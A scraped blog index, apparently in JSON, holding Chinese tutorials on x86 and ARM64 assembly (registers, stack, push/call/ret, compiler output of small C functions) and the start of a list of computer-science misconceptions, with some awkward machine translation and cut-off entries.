教程"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 汇编语言入门教程 学习编程其实就是学高级语言，即那些为人类设计的计算机语言。 但是，计算机不理解高级语言，必须通过编译器转成二进制代码，才能运行。学会高级语言，并不等于理解计算机实际的运行步骤。 计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。 汇编语言不容易学习，就连简明扼要的介绍都很难找到。下面我尝试写一篇最好懂的汇编语言教程，解释 CPU 如何执行代码。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:0:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"一、汇编语言是什么？ 我们知道，CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。 这些指令都是二进制的，称为操作码（opcode），比如加法指令就是00000011。编译器的作用，就是将高级语言写好的程序，翻译成一条条操作码。 对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。 汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令00000011写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:1:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"二、来历 最早的时候，编写程序就是手写二进制指令，然后通过各种开关输入计算机，比如要做加法了，就按一下加法开关。后来，发明了纸带打孔机，通过在纸带上打孔，将二进制指令自动输入计算机。 为了解决二进制指令的可读性问题，工程师将那些指令写成了八进制。二进制转八进制是轻而易举的，但是八进制的可读性也不行。很自然地，最后还是用文字表达，加法指令写成 ADD。内存地址也不再直接引用，而是用标签表示。 这样的话，就多出一个步骤，要把这些文字指令翻译成二进制，这个步骤就称为 assembling，完成这个步骤的程序就叫做 assembler。它处理的文本，自然就叫做 aseembly code。标准化以后，称为 assembly language，缩写为 asm，中文译为汇编语言。 每一种 CPU 的机器指令都是不一样的，因此对应的汇编语言也不一样。本文介绍的是目前最常见的 x86 汇编语言，即 Intel 公司的 CPU 使用的那一种。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:2:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"三、寄存器 学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。 先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。 但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。 寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:3:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"四、寄存器的种类 早期的 x86 CPU 只有8个寄存器，而且每个都有不同的用途。现在的寄存器已经有100多个了，都变成通用寄存器，不特别指定用途了，但是早期寄存器的名字都被保存了下来。 EAX EBX ECX EDX EDI ESI EBP ESP 上面这8个寄存器之中，前面七个都是通用的。ESP 寄存器有特定用途，保存当前 Stack 的地址（详见下一节）。 我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。32 位 CPU 的寄存器大小就是4个字节。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:4:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"五、内存模型：Heap 寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。 程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址。 程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。 这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:5:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"六、内存模型：Stack 除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。 请看下面的例子。 int main() { int a = 2; int b = 3; } 上面代码中，系统开始执行main函数时，会为它在内存里面建立一个帧（frame），所有main的内部变量（比如a和b）都保存在这个帧里面。main函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。 如果函数内部调用了其他函数，会发生什么情况？ int main() { int a = 2; int b = 3; return add_a_and_b(a, b); } 上面代码中，main函数内部调用了add_a_and_b函数。执行到这一行的时候，系统也会为add_a_and_b新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：main和add_a_and_b。一般来说，调用栈有多少层，就有多少帧。 等到add_a_and_b运行结束，它的帧就会被回收，系统会回到函数main刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。 所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做\"入栈\"，英文是 push；栈的回收叫做\"出栈\"，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做\"后进先出\"的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。 Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是0x8000，第一帧假定是16字节，那么下一次分配的地址就会从0x7FF0开始；第二帧假定需要64字节，那么地址就会移动到0x7FB0。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:6:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"七、CPU 指令 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.1 一个实例 了解寄存器和内存模型以后，就可以来看汇编语言到底是什么了。下面是一个简单的程序example.c。 int add_a_and_b(int a, int b) { return a + b; } int main() { return add_a_and_b(2, 3); } gcc 将这个程序转成汇编语言。 $ gcc -S example.c 上面的命令执行以后，会生成一个文本文件example.s，里面就是汇编语言，包含了几十行指令。这么说吧，一个高级语言的简单操作，底层可能由几个，甚至几十个 CPU 指令构成。CPU 依次执行这些指令，完成这一步操作。 example.s经过简化以后，大概是下面的样子。 _add_a_and_b: push %ebx mov %eax, [%esp+8] mov %ebx, [%esp+12] add %eax, %ebx pop %ebx ret _main: push 3 push 2 call _add_a_and_b add %esp, 8 ret 可以看到，原程序的两个函数add_a_and_b和main，对应两个标签_add_a_and_b和_main。每个标签里面是该函数所转成的 CPU 运行流程。 每一行就是 CPU 执行的一次操作。它又分成两部分，就以其中一行为例。 push %ebx 这一行里面，push是 CPU 指令，%ebx是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。 下面我就一行一行讲解这个汇编程序，建议读者最好把这个程序，在另一个窗口拷贝一份，省得阅读的时候再把页面滚动上来。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:1","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.2 push 指令 根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。 然后，开始执行第一行代码。 push 3 push指令用于将运算子放入 Stack，这里就是将3写入main这个帧。 虽然看上去很简单，push指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去4个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4个字节则是因为3的类型是int，占用4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节。 push 2 第二行也是一样，push指令将2写入main这个帧，位置紧贴着前面写入的3。这时，ESP 寄存器会再减去 4个字节（累计减去8）。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:2","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.3 call 指令 第三行的call指令用来调用函数。 call _add_a_and_b 上面的代码表示调用add_a_and_b函数。这时，程序就会去找_add_a_and_b标签，并为该函数建立一个新的帧。 下面就开始执行_add_a_and_b的代码。 push %ebx 这一行表示将 EBX 寄存器里面的值，写入_add_a_and_b这个帧。这是因为后面要用到这个寄存器，就先把里面的值取出来，用完后再写回去。 这时，push指令会再将 ESP 寄存器里面的地址减去4个字节（累计减去12）。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:3","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.4 mov 指令 mov指令用于将一个值写入某个寄存器。 mov %eax, [%esp+8] 这一行代码表示，先将 ESP 寄存器里面的地址加上8个字节，得到一个新的地址，然后按照这个地址在 Stack 取出数据。根据前面的步骤，可以推算出这里取出的是2，再将2写入 EAX 寄存器。 下一行代码也是干同样的事情。 mov %ebx, [%esp+12] 上面的代码将 ESP 寄存器的值加12个字节，再按照这个地址在 Stack 取出数据，这次取出的是3，将其写入 EBX 寄存器。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:4","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.5 add 指令 add指令用于将两个运算子相加，并将结果写入第一个运算子。 add %eax, %ebx 上面的代码将 EAX 寄存器的值（即2）加上 EBX 寄存器的值（即3），得到结果5，再将这个结果写入第一个运算子 EAX 寄存器。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:5","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.6 pop 指令 pop指令用于取出 Stack 最近一个写入的值（即最低位地址的值），并将这个值写入运算子指定的位置。 pop %ebx 上面的代码表示，取出 Stack 最近写入的值（即 EBX 寄存器的原始值），再将这个值写回 EBX 寄存器（因为加法已经做完了，EBX 寄存器用不到了）。 注意，pop指令还会将 ESP 寄存器里面的地址加4，即回收4个字节。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:6","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"7.7 ret 指令 ret指令用于终止当前函数的执行，将运行权交还给上层函数。也就是，当前函数的帧将被回收。 ret 可以看到，该指令没有运算子。 随着add_a_and_b函数终止执行，系统就回到刚才main函数中断的地方，继续往下执行。 add %esp, 8 上面的代码表示，将 ESP 寄存器里面的地址，手动加上8个字节，再写回 ESP 寄存器。这是因为 ESP 寄存器的是 Stack 的写入开始地址，前面的pop操作已经回收了4个字节，这里再回收8个字节，等于全部回收。 ret 最后，main函数运行结束，ret指令退出程序执行。 ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:7:7","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["汇编 教程"],"content":"八、参考链接 Introduction to reverse engineering and Assembly, by Youness Alaoui x86 Assembly Guide, by University of Virginia Computer Science （完） 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-06","objectID":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/:8:0","tags":["汇编 教程"],"title":"汇编语言入门教程","uri":"/zh-cn/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/"},{"categories":["ARM64","汇编语言"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 如何阅读ARM64汇编语言 ARM64是一种计算机架构，与流行的英特尔x86-64架构竞争，用于台式机、笔记本电脑等中的CPU。ARM64在手机1以及基于Graviton的亚马逊EC2实例、树莓派3和4以及备受吹嘘的苹果M1芯片中很常见，所以了解它可能会有用！事实上，由于iPhone，我几乎可以肯定花在ARM64上的时间比x86-64多。 本帖是我之前关于如何阅读汇编语言的帖子的替代版本。它浏览了相同的示例，而是显示了ARM64组件。为了方便您阅读，说明和寄存器的解释等背景内容也会被重审。 说明 汇编语言的基本单元是指令。每个机器指令都是一个小操作，例如添加两个数字，从内存加载一些数据，跳转到另一个内存位置（如可怕的goto语句），或从函数调用或返回。与x86-64不同，每个ARM64指令正好有4字节长，因此您只需计算指令即可判断一段ARM64代码占用了多少内存。 示例1：矢量规范 我们的第一个玩具示例将让我们熟悉简单的说明。它只是计算2D矢量的正方形： #include \u003ccstdint\u003e struct Vec2 { int64_t x; int64_t y; }; int64_t normSquared(Vec2 v) { return v.x * v.x + v.y * v.y; } 以下是从第11条带产生的ARM64组件： mul x8, x1, x1 madd x0, x0, x0, x8 ret 第一条指令，mul x8, x1, x1，执行乘法。与我们之前使用的x86-64程序集语法不同，目标操作数在左侧。本mul指令将x1的内容平方，并将结果存储到x8。 接下来，我们有madd x0, x0, x0, x8。madd代表“乘法添加”：它平方x0，添加x8，并将结果存储在x0中。 最后，ret从normSquared返回。 登记册 让我们绕个简短的绕道，解释一下我们在示例中看到的寄存器是什么。寄存器是装配语言的“变量”。与您最喜欢的编程语言中的变量（可能）不同，它们数量有限，它们具有标准化的名称，我们将谈论的变量最多64位大小。ARM64有31个名为x0到x30的通用寄存器。要引用它们的下32位，而不是完整的64位，我们可以写w0到w30。还有一个专用的sp（堆栈指针）寄存器。核心注册名称的完整文档可在ARM网站上找到。 示例2：堆栈 现在，让我们扩展我们的示例，在normSquared中调试打印Vec2： #include \u003ccstdint\u003e struct Vec2 { int64_t x; int64_t y; void debugPrint() const; }; int64_t normSquared(Vec2 v) { v.debugPrint(); return v.x * v.x + v.y * v.y; } 同样，让我们看看生成的程序集： sub sp, sp, #32 stp x29, x30, [sp, #16] add x29, sp, #16 stp x0, x1, [sp] mov x0, sp bl Vec2::debugPrint() const ldp x8, x9, [sp] ldp x29, x30, [sp, #16] mul x8, x8, x8 madd x0, x9, x9, x8 add sp, sp, #32 ret 我们从一个新的寄存器开始：sp。与x86-64上的%rsp，它是“堆栈指针”，用于维护函数调用堆栈。它指向堆栈的底部，该堆栈在ARM64上“向下”（向下）增长。因此，我们的sub sp, sp, #32指令正在通过从堆栈指针中提取，为堆栈上的四个64位整数腾出空间。接下来，stp x29, x30, [sp, #16]正在修复一对寄存器：它正在从地址sp + 16开始在堆栈上保存旧帧指针（x29）和链接寄存器（x30-它包含返回地址，我们将在下面看到）。（方括号表示内存访问。）我们使用add x29, sp, #16计算新的帧指针；它需要指向之前保存的帧指针和堆栈指针。这结束了3个指令功能的序幕。 Then, the following stp x0, x1, [sp] instruction stores the first and second arguments to normSquared, which are v.x and v.y, to the stack, effectively creating a copy of v in memory at the address in sp. Next, we put a pointer to that copy of v in x0 with mov x0, sp and call Vec2::debugPrint() const with bl. bl is a mnemonic for “branch with link”, and it works slightly differently from the x86-64 call instruction: rather than pushing the return address onto the stack, it saves it in register x30, also known as the link register or lr. After debugPrint has returned, we LoaD the Pair of registers r8 and r9 with v.x and v.y from the stack. We also restore the old values of the frame pointer and stack pointer. Then, we have the same muland madd instructions as in the previous example. Finally , we add sp, sp, #32 to clean up the 32 bytes of stack space we allocated at the start of our function (called the function epilogue; I would include the load of the old frame pointer and stack pointer even though it happened to come before the mul \u0026 madd) and then return to our caller with ret. 示例3：控制流程 现在，让我们看看另一个例子。假设我们想打印一个大写C字符串，并且我们希望避免为小字符串进行堆分配。2我们可能会写以下内容： #include \u003ccstdio\u003e#include \u003ccstring\u003e#include \u003cmemory\u003e void copyUppercase(char *dest, const char *src); constexpr size_t MAX_STACK_ARRAY_SIZE = 1024; void printUpperCase(const char *s) { auto sSize = strlen(s); if (sSize \u003c= MAX_STACK_ARRAY_SIZE) { char temp[sSize + 1]; copyUppercase(temp, s); puts(temp); } else { // std::make_unique_for_overwrite is missing on Godbolt. std::unique_ptr\u003cchar[]\u003e temp(new char[sSize + 1]); copyUppercase(temp.get(), s); puts(temp.get()); } } 这是[生成的程序集](https://godbolt.org/#g:!((g:!((g","date":"2021-12-06","objectID":"/zh-cn/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BBarm64%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/:0:0","tags":["ARM64","汇编语言"],"title":"如何阅读ARM64汇编语言","uri":"/zh-cn/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BBarm64%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"categories":["汇编语言"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 如何阅读汇编语言 更新：本文现在有一个ARM64端口。 为什么在2021年，有人需要学习汇编语言？首先，阅读汇编语言是准确了解程序正在做什么的方法。确切地说，为什么C++程序是1 MiB（比如）而不是100 KiB？有可能从那个一直被调用的函数中挤出更多性能吗？ 特别是对于C++，很容易忘记或只是没有注意到源代码和语言语义所暗示但未显式拼写的某些操作（例如隐式转换或对副本构造函数或析构函数的调用）。看着编译器生成的程序集，一切都清晰可见。 其次，更实际的原因：到目前为止，尽管不断链接到编译器资源管理器，但此博客上的帖子不需要了解汇编语言。然而，根据大众需求，我们的下一个主题将是参数传递，为此，我们需要对汇编语言有一个基本的理解。我们只会专注于阅读汇编语言，而不是写作。 说明 汇编语言的基本单元是指令。每个机器指令都是一个小操作，例如添加两个数字，从内存加载一些数据，跳转到另一个内存位置（如可怕的goto语句），或从函数调用或返回。（x86架构也有很多不那么小的指令。其中一些是建筑存在40多年积累的遗留的十字架，还有一些是新奇的添加物。） 示例1：矢量规范 我们的第一个玩具示例将让我们熟悉简单的说明。它只是计算2D矢量的正方形： #include \u003ccstdint\u003e struct Vec2 { int64_t x; int64_t y; }; int64_t normSquared(Vec2 v) { return v.x * v.x + v.y * v.y; } 这是通过编译器资源管理器：1从tangg 11生成的x86-64程序集 imulq %rdi, %rdi imulq %rsi, %rsi leaq (%rsi,%rdi), %rax retq 让我们谈谈第一条说明：imulq %rdi, %rdi。此指令执行有符号整数乘法。q后缀告诉我们，它正在64位数量上运行。（相比之下，l、w和b分别表示32位、16位和8位。）它将第一个给定寄存器中的值（rdi；寄存器名称前缀为%符号）乘以第二个寄存器中的值，并将结果存储在第二个寄存器中。这是我们示例C++代码中的平方v.x。 第二个指令与%rsi中的值相同，该值平方为v.y。 接下来，我们有一个奇怪的指令：leaq (%rsi,%rdi), %rax.lea代表“加载有效地址”，它将第一个操作数的地址存储到第二个操作数中。(%rsi, %rdi)的意思是“%rsi + %rdi指向的内存位置”，所以这只是添加%rsi和%rdi，并将结果存储在%rax中。lea是一个奇怪的x86特定的指令；在ARM64这样的更RISC-y架构上，我们希望看到一个普通的旧add指令。2 最后，retq从normSquared函数返回。 注册 让我们绕一小节，解释我们在示例中看到的寄存器是什么。寄存器是程序集语言的“变量”。与您最喜欢的编程语言（可能）不同，它们的数量有限，它们有标准化的名称，我们将谈论的最多64位大小。其中一些有我们稍后会看到的具体用途。我无法从内存中删除这一点，但根据维基百科，x86_64上16个寄存器的完整列表3是rax、rcx、rdx、rbx、rsp、rbp、rsi、rdi、r8、r9、r10、r11、r12、r13、r14和r15。 示例2：堆栈 现在，让我们扩展我们的示例，在normSquared中调试打印Vec2： #include \u003ccstdint\u003e struct Vec2 { int64_t x; int64_t y; void debugPrint() const; }; int64_t normSquared(Vec2 v) { v.debugPrint(); return v.x * v.x + v.y * v.y; } 再说一遍，让我们看看生成的程序集： subq $24, %rsp movq %rdi, 8(%rsp) movq %rsi, 16(%rsp) leaq 8(%rsp), %rdi callq Vec2::debugPrint() const movq 8(%rsp), %rcx movq 16(%rsp), %rax imulq %rcx, %rcx imulq %rax, %rax addq %rcx, %rax addq $24, %rsp retq In addition to the obvious call to Vec2::debugPrint() const, we have some other new instructions and registers! %rsp is special: it is the “stack pointer”, used to maintain the function call stack. It points to the bottom of the stack, which grows “down” (toward lower addresses) on x86. So, our subq $24, %rsp instruction is making space for three 64-bit integers on the stack. (In general, setting up the stack and registers at the start of your function is called the function prologue.) Then, the following two movinstructions store the first and second arguments to normSquared, which are v.x and v.y (more about how parameter passing words in the next blog post!) to the stack, effectively creating a copy of v in memory at the address %rsp + 8. Next, we load the address of our copy of v into %rdi with leaq 8(%rsp), %rdi and then call Vec2::debugPrint() const. debugPrint返回后，我们将v.x和v.y加载回%rcx和%rax。我们有和以前一样的imulq和addq说明。最后，我们addq $24, %rsp来清理我们在函数开始时分配的24字节4个堆栈空间（称为函数结尾），然后用retq返回给我们的调用方。 示例3：框架指针和控制流程 现在，让我们看看另一个例子。假设我们想打印一个大写C字符串，并希望避免对小字符串进行堆分配。5我们可能会写以下内容： #include \u003ccstdio\u003e#include \u003ccstring\u003e#include \u003cmemory\u003e void copyUppercase(char *dest, const char *src); constexpr size_t MAX_STACK_ARRAY_SIZE = 1024; void printUpperCase(const char *s) { auto sSize = strlen(s); if (sSize \u003c= MAX_STACK_ARRAY_SIZE) { char temp[sSize + 1]; copyUppercase(temp, s); puts(temp); } else { // std::make_unique_for_overwrite is missing on Godbolt. std::unique_ptr\u003cchar[]\u003e temp(new char[sSize + 1]); copyUppercase(temp.get(), s); puts(temp.get()); } } 这是生成的程序集：6 printUpperCase(char const*): # @printUpperC","date":"2021-12-06","objectID":"/zh-cn/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/:0:0","tags":["汇编语言"],"title":"如何阅读汇编语言","uri":"/zh-cn/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"categories":["计算机科学"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 关于计算机科学的50个误解 计算机科学（Computer Science，简称 CS）是大学的热门专业。但是，社会上对这个专业有很多误解，甚至本专业的学生也有误解。 一个美国的 CS 老师写了一份清单，列出了许多关于计算机科学的伪命题。它们都是 CS 学生信以为真，以后才慢慢明白，这些都是不正确或不完全正确的命题。 下面就是计算机科学的50个常见误解，欢迎补充。 1、 CS 毕业生懂 C 和 C ++ 语言。 2、 Java 语言是几乎所有编程任务的合理选择。 3、 懂得编程 == 懂得计算机科学。 4、 CS 毕业生是优秀程序员。 5、 CS 毕业生会编程。 6、 CS 教授懂编程。 7、 CS 教授会使用计算机，或者懂得互联网原理。 8、 